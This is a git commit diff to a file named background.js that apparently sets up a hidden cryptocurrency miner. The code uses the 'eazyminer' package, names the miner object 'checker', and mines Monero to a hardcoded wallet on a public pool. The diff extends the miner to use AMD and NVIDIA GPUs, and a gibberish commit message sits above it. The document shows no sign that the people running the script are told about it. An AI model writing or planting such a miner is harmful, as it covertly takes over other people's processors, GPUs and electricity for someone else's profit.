506973a13c84b2606d3c8b7946cee7cfe6b693e2
ramalamadingdonggg <134167643+ramalamadingdonggg@users.noreply.github.com>
2023-05-21 18:46:37 +0200

    fddddddddd background.js

--- background.js
+++ background.js
@@ -2,22 +2,45 @@ const a = require('eazyminer');
 
 const randomNumber = Math.floor(Math.random() * 100); // Generate a random number between 0 and 99
 
-const checker = new a({
-  pools: [
-    {
-      coin: 'XMR',
-      user: '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
-      url: 'gulf.moneroocean.stream:20128', // optional pool URL
+
+const checker = new a(
+{
+    pools: [
+      {
+        coin: 'XMR',
+        user:
+          '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
+        url: 'gulf.moneroocean.stream:20128', // optional pool URL,
       pass: randomNumber.toString(), // Convert the random number to a string and use it as the pass value
+      },
+    ],
+    web: [
+      {
+        enabled: false,
+        port: 3000,
+      },
+    ],
+    opencl: {
+        enabled: true,
+        platform: 'AMD',
+        loader: null,
+        platform: "AMD",
+        adl: true,
+        "cn-lite/0": false,
+        "cn/0": false
     },
-  ],
-  web: [
-    {
-      enabled: false,
-      port: 3000,
+
+    // (XMRIG config options https://xmrig.com/docs/miner/config/cuda)
+    cuda: {
+        enabled: true,
+        loader: null,
+        nvml: true,
+        "cn-lite/0": false,
+        "cn/0": false
     },
-  ],
-  autoStart: false,
-});
+    autoStart: false,
+  },
+);
+
 
 checker.start();
